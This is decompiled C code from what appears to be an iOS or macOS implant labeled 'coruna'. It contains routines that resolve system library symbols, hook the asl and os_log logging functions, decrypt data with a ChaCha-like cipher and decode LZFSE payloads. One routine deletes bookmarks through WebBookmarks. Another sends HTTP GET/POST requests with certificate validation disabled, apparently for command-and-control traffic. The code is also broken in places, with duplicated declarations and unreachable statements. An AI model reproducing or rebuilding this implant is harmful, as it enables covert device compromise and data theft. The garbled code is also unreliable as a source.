    handle = *(long *)(handle + 0x60);
    ptr = arg;
    if (handle != *(long *)(handle + 0x58)) {
      ptr = (unsigned long *)((long)arg + (handle - *(long *)(handle + 0x58)));
    }
    if ((long)size < 0) {
      if ((size >> 0x3e & 1) == 0) {
        handle = handle + (size & 0xffffffff);
      }
      else {
        if (size <= ((uint)size & 0xffff)) {
          return 0x920001;
        }
        handle = *(long *)(addr_2 + (size & 0xffff) * 8);
        u = 0;
        if (handle == 0) goto fail;
      }
      u = size >> 0x20 & 0xffff;
      if ((size & 0x1000000000000) != 0) {
        u = (unsigned long)ptr & 0xffffffffffff | (size >> 0x20) << 0x30;
      }
      u = coruna_identity_8110(handle,size >> 0x31 & 3,u);
    }
    else if ((size >> 0x3e & 1) == 0) {
      u = ((size & 0x7f80000000000) * 0x2000 + handle +
              ((long)(size << 0x15) >> 0x15 & 0xffffffffffffffU)) - *(long *)(handle + 0x50);
    }
    else {
      if (size <= ((uint)size & 0xffff)) {
        return 0x920001;
      }
      u = size >> 0x20 & 0x7ffff;
      if ((size & 0x40000) != 0) {
        u = size >> 0x20 | 0xfffffffffffc0000;
      }
      u = *(long *)(addr_2 + (size & 0xffff) * 8) + u;
    }
fail:
    *arg = u;
    if ((size >> 0x33 & 0x7ff) == 0) {
      return 0;
    }
    arg = arg + ((uint)(size >> 0x33) & 0x7ff);
  } while( true );
}





long coruna_implant_residual_43(int flags,long *handle)
{
  int err;
  int status;
  int *err;
  
  err = *(int *)(*handle + 0x10);
  if (err != 0) {
    status = 0;
    err = (int *)(handle[0xd] + 0x20);
    do {
      if (*err == 0x19) {
        if (status == flags) {
          return (handle[0xb] - handle[10]) + *(long *)(err + 6);
        }
        status = status + 1;
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t
uint64_t coruna_implant_via_resolve_libcache_sym(int64_t *arg,int64_t arg,uint size,int flags,int64_t val,uint64_t val, uint64_t id_2,int64_t n,uint32_t size_x)
{
  int err;
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = 0;
  if (arg == 0) {
    u = 0x91000c;
  }
  else {
    u = coruna_resolve_libcache_sym(arg,val,id_2,&bootargs,size_x);
    if ((int)u == 0x910006 && (size & 1) != 0) {
      val = 0;
      bootargs = 0;
    }
    else if ((int)u != 0) {
      return u;
    }
    err = coruna_resolve_asl_oslog(arg,id_2,&scratch);
    if (err == 0) {
      val = 0;
      bootargs = scratch;
    }
    if ((*(byte *)(n + 0xac) >> 6 & 1) == 0) {
      if (arg < *(long **)(n + 0x58)) {
        return 0x910007;
      }
      if ((long *)((long)*(long **)(n + 0x58) + (unsigned long)*(uint *)(n + 0xa8)) <= arg)
      {
        return 0x910007;
      }
    }
    if (flags == 3) {
      bootargs = (((int)val + (int)bootargs) - (int)arg) + -4;
    }
    else {
      if (flags != 2) {
        if (flags == 1) {
          *arg = val + bootargs;
          return 0;
        }
        return 0;
      }
      bootargs = (int)val + (int)bootargs;
    }
    u = 0;
    *(int *)arg = (int)bootargs;
  }
  return u;
}





uint64_t coruna_resolve_asl_oslog(uint64_t val,uint64_t *id_2,uint64_t *size_3)
{
  bool err;
  long handle;
  int err;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  long serial_9;
  unsigned long u;
  unsigned long size;
  uint version;
  unsigned long port;
  void (*ptr)(void);
  uint64_t tag;
  int *err;
  unsigned long kind;
  uint8_t scratch[8];
  long bootargs;
  
  err = coruna_implant_residual_41(val,"_asl_vlog");
  ptr = coruna_asl_vlog_hook;
  if (err != 0) {
    err = coruna_implant_residual_41(val,"_asl_log");
    ptr = coruna_asl_log_hook;
    if (err != 0) {
      return 0x91000b;
    }
  }
  if (((((k_implant_rodata_word_2c060 == 0 || k_implant_rodata_word_2c068 == 0) || k_implant_rodata_word_2c070 == 0) || k_implant_rodata_word_2c078 == 0) ||
      k_implant_rodata_word_2c790 == 0) || k_implant_rodata_word_2c798 == 0) {
    tag = 0x91000b;
    addr = (*(void (*)*id_2)("/usr/lib/system/libsystem_trace.dylib",0x10);
    if (addr != 0) {
      off = (*(void (*)id_2[1])(addr,"_os_log_actual");
      if ((((off != 0) && (off = (*(void (*)id_2[1])(addr,"_os_log_internal"), off != 0))
          && (base = (*(void (*)id_2[1])(addr,"_os_log_default"), base != 0)) &&
         (ctx_val = (*(void (*)*id_2)("/usr/lib/system/libsystem_c.dylib",0x10), ctx_val != 0)) {
        serial = (*(void (*)id_2[1])(ctx_val,"vasprintf");
        if (((serial != 0) &&
            (serial_7 = (*(void (*)id_2[1])(ctx_val,"_NSGetMachExecuteHeader"), serial_7 != 0)) &&
           ((serial_8 = (*(void (*)id_2[1])(ctx_val,"free"), serial_8 != 0 &&
            ((err = (*(void (*)id_2[2])(off,scratch), err != 0 &&
             (*(int *)(bootargs + 0x10) != 0)))))) {
          version = 0;
          err = (int *)(bootargs + 0x20);
          do {
            if (((*err == 0x19) && (err = coruna_implant_residual_41(err + 2,"__TEXT"), err == 0)) &&
               (err[0x10] != 0)) {
              port = 0;
              serial_9 = *(long *)(err + 6);
              do {
                err = coruna_implant_residual_41(err + port * 0x14 + 0x12,"__oslogstring");
                if (err == 0) {
                  u = *(unsigned long *)(err + port * 0x14 + 0x1c);
                  if (u != 0) {
                    size = 0;
                    kind = 1;
                    do {
                      handle = (bootargs - serial_9) + *(long *)(err + port * 0x14 + 0x1a) +
                              size;
                      err = coruna_return_zero_cd74(handle,"%{public}s",u - size);
                      if (err == 0) {
                        if (bootargs != 0) {
                          tag = 0;
                          k_implant_rodata_word_2c060 = off;
                          k_implant_rodata_word_2c068 = base;
                          k_implant_rodata_word_2c070 = serial;
                          k_implant_rodata_word_2c078 = serial_7;
                          k_implant_rodata_word_2c790 = serial_8;
                          k_implant_rodata_word_2c798 = handle;
                          *size_3 = ptr;
                        }
                        goto fail;
                      }
                      u = *(unsigned long *)(err + port * 0x14 + 0x1c);
                      err = kind < u;
                      size = kind;
                      kind = (unsigned long)((int)kind + 1);
                    } while (err);
                  }
                }
                port = port + 1;
              } while (port < (uint)err[0x10]);
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            version = version + 1;
          } while (version < *(uint *)(bootargs + 0x10));
        }
fail:
        (*(void (*)id_2[3])(ctx_val);
      }
      (*(void (*)id_2[3])(addr);
    }
  }
  else {
    tag = 0;
    *size_3 = ptr;
  }
  return tag;
}





uint64_t
uint64_t coruna_asl_vlog_hook(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4, uint64_t off_5)
{
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  if (k_implant_rodata_word_2c070 == (void (*)0x0) {
    u = 0xffffffff;
  }
  else {
    (*k_implant_rodata_word_2c070)(&scratch,off_4,off_5);
    u = coruna_implant_via_copy_bytes_cc70_4(size_3,scratch);
  }
  return u;
}





uint64_t coruna_asl_log_hook(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  if (k_implant_rodata_word_2c070 == (void (*)0x0) {
    u = 0xffffffff;
  }
  else {
    (*k_implant_rodata_word_2c070)(&scratch,off_4,&ghidra_stack_0);
    u = coruna_implant_via_copy_bytes_cc70_4(size_3,scratch);
  }
  return u;
}





uint64_t coruna_implant_via_copy_bytes_cc70_4(uint size,long handle)
{
  void (*ptr)(void);
  long handle;
  void (*buf)(void);
  void (*str)(void);
  long addr;
  uint64_t u;
  uint8_t scratch[6];
  uint16_t bootargs;
  
  addr = k_implant_rodata_word_2c798;
  str = k_implant_rodata_word_2c790;
  buf = k_implant_rodata_word_2c078;
  handle = k_implant_rodata_word_2c068;
  ptr = k_implant_rodata_word_2c060;
  if (((((k_implant_rodata_word_2c060 != (void (*)0x0 && k_implant_rodata_word_2c068 != 0) && k_implant_rodata_word_2c078 != (void (*)0x0) &&
       k_implant_rodata_word_2c790 != (void (*)0x0) && k_implant_rodata_word_2c798 != 0) && size < 7 ||
      ((((k_implant_rodata_word_2c060 != (void (*)0x0 && k_implant_rodata_word_2c068 != 0) && k_implant_rodata_word_2c078 != (void (*)0x0) &&
       k_implant_rodata_word_2c790 != (void (*)0x0) && k_implant_rodata_word_2c798 != 0) && size == 7) {
    coruna_copy_bytes_cc70(scratch,8);
    scratch[0] = 0;
    bootargs = 0x201;
    if (handle != 0) {
      u = (*buf)();
      (*ptr)(u,handle,scratch[size],addr);
      (*str)(handle);
      return 0;
    }
  }
  return 0xffffffff;
}





long coruna_implant_residual_44(long *handle)
{
  int err;
  int *err;
  
  err = *(int *)(*handle + 0x10);
  if (err != 0) {
    err = (int *)(handle[0xd] + 0x20);
    do {
      if ((*err == 0x19) && ((*(byte *)(err + 0xf) >> 1 & 1) != 0)) {
        return *(long *)(err + 6) + (handle[0xb] - handle[10]);
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      err = err + -1;
    } while (err != 0);
  }
  return 0;
}





uint64_t
uint64_t coruna_return_zero_ead4(int64_t arg,uint *size,uint64_t *val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  ushort size;
  int err;
  unsigned long scratch;
  
  scratch = 0;
  if (((~(byte)size[1] & 0xe) == 0) &&
     (size = *(ushort *)((long)size + 6), ((byte)size[1] & 0x10) != 0 || (size & 0x80) != 0)
     ) {
    scratch = *(long *)(size + 2) + *(long *)(arg + 0x60);
    *val = scratch;
    if ((size >> 3 & 1) == 0) {
      return 1;
    }
    scratch = scratch | 1;
  }
  else {
    if ((*(long *)(arg + 0x48) == 0) ||
       (u = *(long *)(arg + 0x48) + (unsigned long)*size,
       u < *(unsigned long *)(arg + 0x58) ||
       *(unsigned long *)(arg + 0x58) + (unsigned long)*(uint *)(arg + 0xa8) <= u)) {
      return 0;
    }
    err = coruna_resolve_libcache_sym(u,id_2,size_3,&scratch,0);
    if (err != 0) {
      return 0;
    }
    *val = scratch;
    err = coruna_resolve_asl_oslog(u,size_3,&scratch);
    if (err != 0) {
      return 1;
    }
  }
  *val = scratch;
  return 1;
}





void coruna_objc_nsobject_pair(uint64_t val,uint64_t id_2,long handle)
{
  uint32_t u;
  int err;
  uint64_t size;
  long handle;
  long addr;
  uint64_t version;
  uint8_t *ptr;
  long off;
  
  handle = *(long *)(handle + 0x30);
  ptr = *(uint8_t **)(handle + 0x20);
  if (ptr != &k_implant_ctx_slot_tertiary) {
    if (ptr == &k_implant_ctx_slot_secondary) {
      if (*(long *)(handle + 0x28) == 0) {
        return;
      }
      coruna_dyld_cached_port_ptr(handle,*(long *)(handle + 0x28),0x330);
      *(long *)(handle + 0x110) = *(long *)(handle + 0x110) + 4;
      return;
    }
    if (ptr != &k_implant_ctx_slot_primary) {
      return;
    }
  }
  addr = *(long *)(handle + 0x28);
  if (addr != 0) {
    coruna_dyld_cached_port_ptr(addr,handle,0x330);
    version = *(uint64_t *)(addr + 0x330);
    *(uint8_t **)(handle + 0x20) = &k_implant_ctx_slot_secondary;
    *(long *)(handle + 0x108) = addr + 0x3fe0;
    u = *(uint32_t *)(handle + 0x10);
    *(uint32_t *)(addr + 0x3ffc) = u;
    *(uint32_t *)(&k_implant_ctx_field_u32 + addr) = u;
    if (ptr == &k_implant_ctx_slot_tertiary) {
      off = *(long *)(addr + 0x338);
      err = coruna_return_zero();
      if (err == 0) {
        size = 0x1000;
      }
      else {
        size = coruna_pacib(0x1000,&UNK_00004030 + addr);
      }
      *(uint64_t *)(&k_implant_ctx_field_u64 + addr) = size;
      off = *(long *)(handle + 0x18) + off;
    }
    else {
      off = *(long *)(handle + 0x18);
    }
    *(long *)(handle + 0xa8) = off;
    *(uint64_t *)(handle + 0x110) = version;
  }
  return;
}





uint64_t
uint64_t coruna_macho_find_section(uint64_t val,uint64_t id_2,int64_t arg,int64_t *arg,uint64_t *size_3)
{
  uint64_t u;
  int err;
  uint64_t size;
  unsigned long version;
  int *err;
  int *status;
  int *flags;
  int *count;
  int *idx;
  uint port;
  
  size = 0x18006;
  if (*(int *)(arg + 0x10) != 0) {
    status = (int *)0x0;
    port = 0;
    err = (int *)(arg + 0x20);
    count = (int *)0x0;
    do {
      idx = count;
      if ((count != (int *)0x0) && (status != (int *)0x0)) break;
      if (*err == 0x19) {
        err = coruna_implant_residual_41(err + 2,"__TEXT");
        idx = err;
        if (err != 0) {
          idx = count;
        }
        if (status == (int *)0x0) {
          err = coruna_implant_residual_41(err + 2,val);
          if ((err == 0) && (err[0x10] != 0)) {
            version = 0;
            count = err + 0x12;
            flags = (int *)0x0;
            do {
              err = coruna_implant_residual_41(count,id_2);
              status = count;
              if (err != 0) {
                status = flags;
              }
              version = version + 1;
              count = count + 0x14;
              flags = status;
            } while (version < (uint)err[0x10]);
          }
          else {
            status = (int *)0x0;
          }
        }
      }
      err = (int *)((long)err + (unsigned long)(uint)err[1]);
      port = port + 1;
      count = idx;
    } while (port < *(uint *)(arg + 0x10));
    size = 0x18006;
    if ((idx != (int *)0x0) && (status != (int *)0x0)) {
      size = 0;
      u = *(uint64_t *)(status + 10);
      *arg = (arg - *(long *)(idx + 6)) + *(long *)(status + 8);
      *size_3 = u;
    }
  }
  return size;
}





uint64_t
uint64_t coruna_bind_resolver(int64_t arg,uint64_t val,uint size,uint64_t id_2,int64_t arg,uint64_t *size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  int err;
  long extraout_x1;
  unsigned long *ptr;
  unsigned long version;
  size_t ls7;
  unsigned long port;
  unsigned long scratch;
  unsigned long scratch;
  unsigned long *bootargs;
  uint8_t *thread_attr;
  uint8_t host_info[16];
  long serial_buf;
  unsigned long action;
  
  (*(void (*)k_implant_chkstk_darwin_slot)(arg,(unsigned long)(size + 1) << 3);
  handle = -(extraout_x1 + 0xfU & 0xffffffff0);
  ptr = (unsigned long *)((long)&scratch + handle);
  coruna_copy_bytes_cc70(ptr);
  version = (id_2 + arg) - 1;
  if (id_2 <= version) {
    port = 0;
    scratch = (unsigned long)size;
    ls7 = scratch << 3;
    bootargs = size_3;
    thread_attr = (uint8_t *)&scratch;
    do {
      err = (**(void (**)(arg + 0x10))(version,host_info);
      size = action;
      if ((err != 0) && (action != port)) {
        _memmove((void *)((long)&scratch + handle),ptr,ls7);
        *ptr = size;
        if ((serial_buf != 0) && (err = coruna_implant_residual_41(serial_buf,val), err == 0)) {
          *bootargs = ptr[scratch];
          return 0;
        }
        port = size;
        if (size != 0) {
          u = version;
          if (size < id_2 + arg && id_2 <= size) {
            u = size;
          }
          if (size < version) {
            version = u;
          }
        }
      }
      version = version - 1;
    } while (id_2 <= version);
  }
  return 0x18005;
}





uint64_t coruna_webbookmarks_delete(char *path)
{
  uint64_t u;
  long handle;
  long addr;
  unsigned long size;
  long off;
  uint64_t version;
  uint64_t port;
  uint8_t size[16];
  uint8_t version[16];
  
  port = 0xad00b;
  if (path == (char *)0x0) {
    return 0xad001;
  }
  if (*path == '\0') {
    return 0xad001;
  }
  u = _objc_autoreleasePoolPush();
  size = _dlopen("/System/Library/PrivateFrameworks/WebBookmarks.framework/WebBookmarks",2);
  _objc_autoreleasePoolPop(u);
  return port;
}





uint64_t coruna_lzfse_decode(uint64_t *dst,uint *src)
{
  uint u;
  uint size;
  void *ptr;
  unsigned long version;
  uint64_t port;
  int *err;
  unsigned long tag;
  
  port = 0xad001;
  if (((dst != (uint64_t *)0x0) &&
      (err = (int *)*dst, err != (int *)0x0 && src != (uint *)0x0)) &&
     (u = *src, u != 0)) {
    if ((7 < u) && (*err == 0xbedf00d)) {
      size = err[1];
      tag = (unsigned long)size;
      if ((size != 0) && (u - 8 < size)) {
        ptr = _malloc(tag + 1);
        if (ptr == (void *)0x0) {
          return 0xad009;
        }
        _memset_s(ptr,tag,0,tag);
        version = _compression_decode_buffer(ptr,tag + 1,err + 2,u - 8,0,0x306);
        if (version == tag) {
          _memset_s(err,u,0,u);
          _free(err);
          *dst = ptr;
          *src = size;
          return 0;
        }
        _memset_s(ptr,tag,0,tag);
        _free(ptr);
        return 0xad00b;
      }
    }
    port = 0;
  }
  return port;
}
void coruna_implant_via_u64_pack(uint *size,long handle,long addr_2)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint kind;
  uint type_id;
  uint type_id_8;
  uint type_id_9;
  uint type_id_10;
  uint type_id_11;
  uint type_id_12;
  long handle;
  byte err;
  int err;
  unsigned long type_id_13;
  uint type_id_14;
  uint type_id_15;
  uint type_id_16;
  uint type_id_17;
  uint type_id_18;
  long addr;
  uint32_t scratch;
  uint scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint block_ctx;
  uint serial_buf;
  uint action;
  uint block_ctx;
  uint stack_guard;
  uint sa_saved;
  uint sa_new;
  uint path_buf;
  uint64_t stack_guard;
  uint64_t tmp_buf;
  
  tag = k_implant_rodata_word_00026a48;
  if (((handle != 0) && (addr_2 != 0)) && (size != (uint *)0x0)) {
    handle = 0;
    host_info = 0;
    thread_attr = 0;
    serial_buf = 0;
    host_info = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    block_ctx = *size;
    sa_saved = (uint)*(uint64_t *)(size + 5);
    sa_new = (uint)((unsigned long)*(uint64_t *)(size + 5) >> 0x20);
    action = k_implant_md5_init_state;
    block_ctx = (uint)*(uint64_t *)(size + 3);
    stack_guard = (uint)((unsigned long)*(uint64_t *)(size + 3) >> 0x20);
    serial_buf = (uint)*(uint64_t *)(size + 1);
    action = (uint)((unsigned long)*(uint64_t *)(size + 1) >> 0x20);
    path_buf = size[7];
    stack_guard = 0;
    tmp_buf = 0;
    type_id_13 = 0x40;
    do {
      if (type_id_13 < 0x40) {
        err = *(byte *)((long)&scratch + type_id_13);
      }
      else {
        scratch = (uint)action;
        scratch = (uint)((unsigned long)action >> 0x20);
        host_info = (uint)stack_guard;
        kind = (uint)host_info;
        host_info = (uint)((unsigned long)stack_guard >> 0x20);
        type_id = host_info;
        bootargs = (uint)tag;
        bootargs = (uint)((unsigned long)tag >> 0x20);
        serial_buf = 0;
        serial_buf = 0;
        err = 10;
        type_id_16 = block_ctx;
        type_id_14 = serial_buf;
        type_id_17 = stack_guard;
        type_id_18 = sa_saved;
        type_id_9 = action;
        type_id_12 = block_ctx;
        type_id_10 = (uint)bootargs;
        type_id_11 = bootargs;
        type_id_15 = sa_new;
        type_id_8 = path_buf;
        do {
          host_info = (uint)host_info ^ scratch + type_id_16;
          type_id_17 = ((uint)host_info >> 0x10 | (uint)host_info << 0x10) + type_id_17;
          u = type_id_17 ^ type_id_16;
          scratch = (u >> 0x14 | u << 0xc) + scratch + type_id_16;
          type_id_16 = scratch ^ ((uint)host_info >> 0x10 | (uint)host_info << 0x10);
          type_id_17 = (type_id_16 >> 0x18 | type_id_16 << 8) + type_id_17;
          u = type_id_17 ^ (u >> 0x14 | u << 0xc);
          host_info = host_info ^ scratch + type_id_14;
          type_id_18 = (host_info >> 0x10 | host_info << 0x10) + type_id_18;
          size = type_id_18 ^ type_id_14;
          scratch = (size >> 0x14 | size << 0xc) + scratch + type_id_14;
          version = scratch ^ (host_info >> 0x10 | host_info << 0x10);
          type_id_18 = (version >> 0x18 | version << 8) + type_id_18;
          type_id_14 = type_id_18 ^ (size >> 0x14 | size << 0xc);
          serial_buf = (uint)serial_buf ^ type_id_10 + type_id_9;
          type_id_15 = ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10) + type_id_15;
          size = type_id_15 ^ type_id_9;
          type_id_10 = (size >> 0x14 | size << 0xc) + type_id_10 + type_id_9;
          port = type_id_10 ^ ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10);
          type_id_15 = (port >> 0x18 | port << 8) + type_id_15;
          type_id_9 = type_id_15 ^ (size >> 0x14 | size << 0xc);
          serial_buf = serial_buf ^ type_id_11 + type_id_12;
          type_id_8 = (serial_buf >> 0x10 | serial_buf << 0x10) + type_id_8;
          size = type_id_8 ^ type_id_12;
          type_id_11 = (size >> 0x14 | size << 0xc) + type_id_11 + type_id_12;
          type_id_12 = type_id_11 ^ (serial_buf >> 0x10 | serial_buf << 0x10);
          type_id_8 = (type_id_12 >> 0x18 | type_id_12 << 8) + type_id_8;
          size = type_id_8 ^ (size >> 0x14 | size << 0xc);
          scratch = (type_id_14 >> 0x19 | type_id_14 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x18 | type_id_12 << 8);
          type_id_15 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x19 | type_id_14 << 7);
          scratch = (type_id_14 >> 0x14 | type_id_14 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          serial_buf = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_15 = serial_buf + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x14 | type_id_14 << 0xc);
          type_id_14 = type_id_14 >> 0x19 | type_id_14 << 7;
          scratch = (type_id_9 >> 0x19 | type_id_9 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_16 >> 0x18 | type_id_16 << 8);
          type_id_8 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_8;
          type_id_9 = type_id_8 ^ (type_id_9 >> 0x19 | type_id_9 << 7);
          scratch = (type_id_9 >> 0x14 | type_id_9 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          host_info = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_8 = (uint)host_info + type_id_8;
          type_id_9 = type_id_8 ^ (type_id_9 >> 0x14 | type_id_9 << 0xc);
          type_id_9 = type_id_9 >> 0x19 | type_id_9 << 7;
          type_id_10 = (size >> 0x19 | size << 7) + type_id_10;
          type_id_12 = type_id_10 ^ (version >> 0x18 | version << 8);
          type_id_17 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_17;
          type_id_16 = type_id_17 ^ (size >> 0x19 | size << 7);
          type_id_10 = (type_id_16 >> 0x14 | type_id_16 << 0xc) + type_id_10;
          type_id_12 = type_id_10 ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          host_info = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_17 = host_info + type_id_17;
          type_id_12 = type_id_17 ^ (type_id_16 >> 0x14 | type_id_16 << 0xc);
          type_id_12 = type_id_12 >> 0x19 | type_id_12 << 7;
          type_id_11 = type_id_11 + (u >> 0x19 | u << 7);
          type_id_16 = type_id_11 ^ (port >> 0x18 | port << 8);
          type_id_18 = (type_id_16 >> 0x10 | type_id_16 << 0x10) + type_id_18;
          u = type_id_18 ^ (u >> 0x19 | u << 7);
          type_id_11 = (u >> 0x14 | u << 0xc) + type_id_11;
          type_id_16 = type_id_11 ^ (type_id_16 >> 0x10 | type_id_16 << 0x10);
          serial_buf = type_id_16 >> 0x18 | type_id_16 << 8;
          type_id_18 = (uint)serial_buf + type_id_18;
          type_id_16 = type_id_18 ^ (u >> 0x14 | u << 0xc);
          type_id_16 = type_id_16 >> 0x19 | type_id_16 << 7;
          err = err + -1;
        } while (err != 0);
        addr = 0;
        thread_attr = coruna_u64_pack((type_id_12), (type_id_9));
        thread_attr = coruna_u64_pack((type_id_18), (type_id_17));
        host_info = coruna_u64_pack((type_id_8), (type_id_15));
        err = (char)action + (char)scratch;
        bootargs = coruna_u64_pack((bootargs + type_id_11), ((uint))bootargs + type_id_10);
        bootargs = coruna_u64_pack((type_id_14), (type_id_16));
        do {
          *(unsigned long *)((long)&thread_attr + addr) =
               coruna_u64_pack(((int)((unsigned long)*(uint64_t *)((long)&action + addr) >> 0x20) +
                        (int)((unsigned long)*(uint64_t *)((long)&thread_attr + addr) >> 0x20)), (int)*(uint64_t *)((long)&action + addr) +
                        (int)*(uint64_t *)((long)&thread_attr + addr));
          *(unsigned long *)((long)&bootargs + addr) =
               coruna_u64_pack(((int)((unsigned long)*(uint64_t *)((long)&block_ctx + addr) >> 0x20) +
                        (int)((unsigned long)*(uint64_t *)((long)&bootargs + addr) >> 0x20)), (int)*(uint64_t *)((long)&block_ctx + addr) +
                        (int)*(uint64_t *)((long)&bootargs + addr));
          addr = addr + 0x10;
        } while (addr != 0x30);
        stack_guard = coruna_u64_pack((type_id), (kind + 1));
        type_id_13 = 0;
        if (kind == 0xffffffff) {
          stack_guard = (unsigned long)(type_id + 1) << 0x20;
        }
      }
      *(byte *)(handle + handle) = *(byte *)(handle + handle) ^ err;
      type_id_13 = type_id_13 + 1;
      handle = handle + 1;
    } while (handle != addr_2);
  }
  return;
}





int coruna_cfhttp_get_post(char *path,long handle,long addr_2,char *str_2,uint64_t *val,
                uint *size)
{
  char *ptr;
  bool err;
  bool status;
  int err;
  uint u;
  long handle;
  long addr;
  long off;
  size_t ls9;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  long serial_9;
  long *ptr;
  uint64_t size;
  void *buf;
  void *str;
  long *copy;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void (*buf)(void);
  uint64_t type_id_10;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  long *stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t sa_saved;
  uint64_t sa_new[2];
  
  action = 0;
  err = val == (uint64_t *)0x0;
  status = size == (uint *)0x0;
  if (path == (char *)0x0) {
    return 0xad001;
  }
  if (*path == '\0') {
    return 0xad001;
  }
  if ((err || status) && (val != (uint64_t *)0x0 || size != (uint *)0x0)) {
    return 0xad001;
  }
  type_id_10 = *(uint64_t *)k_implant_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(type_id_10,path,0x8000100);
  if (handle == 0) {
    err = 0x3002;
    if (action != 0) {
    _CFRelease();
    }
    return err;
  }
  addr = _CFStringGetLength();
  off = handle;
  if (addr < 1) {
    err = 0x3003;
  }
  else {
    addr = 0;
    if (handle == 0) {
done:
      if (addr_2 == 0) {
        scratch = 0;
cleanup:
        if (str_2 == (char *)0x0) {
          off = 0;
check_ok:
          u = 0;
          copy = &action;
          if (err || status) {
            copy = (long *)0x0;
          }
          ptr = "GET";
          if (off != 0) {
            ptr = "POST";
          }
          version = *(uint64_t *)k_implant_kcfhttpversion1_1_slot;
          type_id = *(uint64_t *)k_implant_kcfstreamsslvalidatescertificatechain_slot;
          port = *(uint64_t *)k_implant_kcfbooleanfalse_slot;
          type_id_8 = *(uint64_t *)k_implant_kcfstreampropertysslsettings_slot;
          tag = *(uint64_t *)k_implant_kcfstreampropertyhttpproxy_slot;
          type_id_9 = *(uint64_t *)k_implant_kcfrunloopcommonmodes_slot;
          kind = *(uint64_t *)k_implant_kcfrunloopdefaultmode_slot;
          do {
            if (!err && !status) {
              *copy = 0;
            }
            base = _CFURLCreateWithString(type_id_10,handle,0);
            if (base == 0) {
              if (6 < u) {
                err = 0x3002;
                _CFRelease(handle);
                if (addr != 0) {
                load_ok:
                _CFRelease(addr);
                }
                if (scratch != 0) {
                _CFRelease(scratch);
                }
                if (action != 0) {
                _CFRelease();
                }
                return err;
                _CFRelease(off);
                if (action != 0) {
                _CFRelease();
                }
                return err;
              }
            }
            else {
              ctx_val = _CFURLCopyScheme();
              if (ctx_val == 0) {
                err = 0x300d;
                serial = base;
next:
                _CFRelease(serial);
              }
              else {
                serial = _CFStringCreateWithCString(type_id_10,ptr,0x8000100);
                err = 0xad009;
                if (serial == 0) {
retry:
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  if (serial != 0) goto next;
                }
                else {
                  serial_7 = _CFHTTPMessageCreateRequest(type_id_10,serial,base,version);
                  if (serial_7 == 0) {
                    err = 0x3009;
                    goto retry;
                  }
                  if (off != 0) {
                    _CFHTTPMessageSetBody(serial_7);
                  }
                  if (addr == 0) {
                    serial_buf = 0;
found:
                    if (scratch == 0) {
                      host_info = 0;
                    }
                    else {
                      host_info = _CFStringCreateWithCString(type_id_10,"Content-Type",0x8000100);
                      if (host_info == 0) goto nomem;
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,host_info,scratch);
                    }
                    serial_8 = _CFReadStreamCreateForHTTPRequest(type_id_10,serial_7);
                    if (serial_8 == 0) {
                      bootargs = 0;
                      thread_attr = 0;
                      err = 0x300a;
                    }
                    else {
                      thread_attr = _CFStringCreateWithCString(type_id_10,"https",0x8000100);
                      if (thread_attr == 0) {
                        bootargs = 0;
                        err = 0xad009;
                      }
                      else {
                        err = _CFEqual(thread_attr,ctx_val);
                        if (err == 0) {
invalid:
                          serial_9 = _SCDynamicStoreCopyProxies(0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300e;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,tag,serial_9);
                            _CFRelease(serial_9);
                            continue;
                            serial_9 = _CFHTTPMessageCreateEmpty(type_id_10,0);
                            if (serial_9 == 0) {
                              bootargs = 0;
                              err = 0x3009;
                            }
                            else {
                              ptr = _calloc(0x10,1);
                              if (ptr == (long *)0x0) {
                                bootargs = 0;
                                err = 0xad009;
                              }
                              else {
                                *ptr = serial_9;
                                *(uint32_t *)((long)ptr + 0xc) = 500;
                                block_ctx = 0;
                                bootargs = 0;
                                scratch = 0;
                                sa_saved = 0;
                                buf = coruna_cfhttp_stream_client;
                                stack_guard = ptr;
                                err = coruna_return_zero();
                                if (err != 0) {
                                  buf = (void (*)coruna_pacia(coruna_cfhttp_stream_client,0);
                                }
